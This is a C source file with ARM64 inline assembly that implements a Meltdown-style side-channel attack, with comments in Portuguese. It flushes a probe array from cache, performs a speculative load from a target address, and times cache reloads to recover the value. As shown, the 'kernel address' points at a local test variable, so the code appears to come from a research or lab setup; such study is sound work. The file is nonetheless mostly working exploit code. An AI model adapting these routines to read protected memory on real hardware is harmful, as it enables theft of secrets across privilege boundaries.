#include "../inc/meltdown.h"
#include "../../../VMs/vm_0/src/tasks/inc/globals.h"

#include <stdio.h>

extern uint8_t array[256 * 512];
uint8_t secret_data = 42; 
void *kernel_address = &secret_data; 

void try_meltdown_read(void *addr) {
    unsigned long val;
    

    asm volatile (
        "ldr %0, [%1]\n\t"        // Tenta carregar o segredo
        "lsl %0, %0, #12\n\t"     // Multiplica por 4096
        "ldr x2, [%2, %0]\n\t"    // Acessa array2[segredo * 4096]
        : "=&r" (val)             // Saída
        : "r" (addr), "r" (array)// Entradas
        : "x2", "memory"          // Clobbers
    );
}

int measure_cache_meltdown(int threshold) {
    uint64_t start, end;
    int hit_index = -1;
    volatile uint8_t *addr;

    for (int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255; // Embaralha para evitar stride prediction
        addr = &array[mix_i * 512]; // Usando stride 512 do seu código spectre

        // Mede tempo de acesso
        asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(start));
        volatile uint8_t junk = *addr;
        asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(end));

        if ((end - start) <= threshold) {
            hit_index = mix_i;
        }
    }
    return hit_index;
}

void execute_meltdown_attack(int cache_hit_threshold, uint32_t duration_ms) {
    uint64_t start_time = get_hardware_timer_count();
    uint64_t timer_freq = get_hardware_timer_freq();
    
    // Converte os milissegundos desejados para ciclos do hardware
    uint64_t duration_hardware_ticks = (timer_freq / 1000) * duration_ms;
    uint64_t end_attack_time = start_time + duration_hardware_ticks;

    // Loop de ataque rodando 100% no hardware puro, sem RTOS
    while (get_hardware_timer_count() < end_attack_time) {
        
        for (int i = 0; i < 256; i++) {
             asm volatile("dc civac, %0" : : "r"(&array[i * 512]) : "memory");
        }
        asm volatile("dsb sy \n isb");

        try_meltdown_read(kernel_address); 
        
        //reload
        volatile int result = measure_cache_meltdown(cache_hit_threshold);
        (void)result;
    }
}
